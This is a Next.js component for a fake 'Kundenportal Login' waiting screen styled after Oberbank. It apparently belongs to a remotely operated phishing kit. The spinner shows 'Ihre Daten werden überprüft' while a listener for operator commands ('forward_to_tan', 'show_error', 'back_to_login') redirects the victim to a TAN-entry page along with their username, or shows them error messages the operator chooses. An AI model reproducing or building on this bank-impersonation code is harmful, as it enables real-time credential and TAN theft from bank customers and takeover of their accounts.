"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { onCommand } from "@/lib/track";

export default function WaitingScreen({ user }: { user: string }) {
  const router = useRouter();
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    onCommand((cmd) => {
      if (cmd.type === "forward_to_tan") {
        const code = (cmd.payload as { code?: string }).code || "";
        router.push(`/pushtan?code=${encodeURIComponent(code)}&user=${encodeURIComponent(user)}`);
      } else if (cmd.type === "back_to_login") {
        router.push("/");
      } else if (cmd.type === "show_error") {
        setError((cmd.payload as { message?: string }).message || "Ein Fehler ist aufgetreten.");
      } else if (cmd.type === "clear_error") {
        setError(null);
      }
    });
    return () => onCommand(() => {});
  }, [router, user]);

  return (
    <div className="min-h-screen flex flex-col" style={{ background: "#fafcfc" }}>
      <Header />

      <main className="flex-1 flex items-start justify-center">
        <div className="w-full max-w-[480px] mx-auto px-4 py-8">
            <div className="obr-tile flex flex-col">
              <div className="obr-tile-header">
                <h2 className="text-base font-medium" style={{ color: "#30454c" }}>
                  Kundenportal Login
                </h2>
              </div>

              <div className="obr-tile-content flex-1">
                {error && (
                  <p className="text-xs mb-4" style={{ color: "#c90000" }}>
                    {error}
                  </p>
                )}

                <div className="flex flex-col items-center gap-4 py-6">
                  {/* Spinner in Oberbank accent red */}
                  <svg
                    className="animate-spin"
                    width="44"
                    height="44"
                    viewBox="0 0 44 44"
                    fill="none"
                  >
                    <circle
                      cx="22"
                      cy="22"
                      r="18"
                      stroke="var(--obr-gray-light)"
                      strokeWidth="4"
                    />
                    <path
                      d="M40 22c0-9.941-8.059-18-18-18"
                      stroke="var(--obr-accent)"
                      strokeWidth="4"
                      strokeLinecap="round"
                    />
                  </svg>

                  <p className="text-xs text-center" style={{ color: "#30454c" }}>
                    Ihre Daten werden überprüft...
                  </p>
                  <p className="text-xs text-center" style={{ color: "#8e8e93" }}>
                    Bitte warten Sie einen Moment.
                  </p>
                </div>
              </div>

              <div className="obr-tile-footer flex justify-end">
                <button
                  type="button"
                  className="obr-btn-borderless"
                  onClick={() => router.push("/")}
                >
                  Abbrechen
                </button>
              </div>
            </div>
        </div>
      </main>

      <Footer />
    </div>
  );
}
